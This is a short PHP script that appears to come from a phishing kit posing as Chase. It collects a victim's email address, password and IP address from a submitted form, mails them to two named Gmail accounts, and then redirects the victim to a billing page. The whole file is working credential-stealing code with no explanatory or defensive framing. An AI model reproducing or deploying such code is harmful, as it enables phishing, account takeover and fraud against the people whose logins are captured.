<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Email Address             : ".$_POST['emaiadd']."\n";
$message .= "Email Password              : ".$_POST['emailpass']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "stevbodaesq@gmail.com, ktwllms840@gmail.com";
$subject = " Chase EMAIL ACCESS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  billing.html");
?>


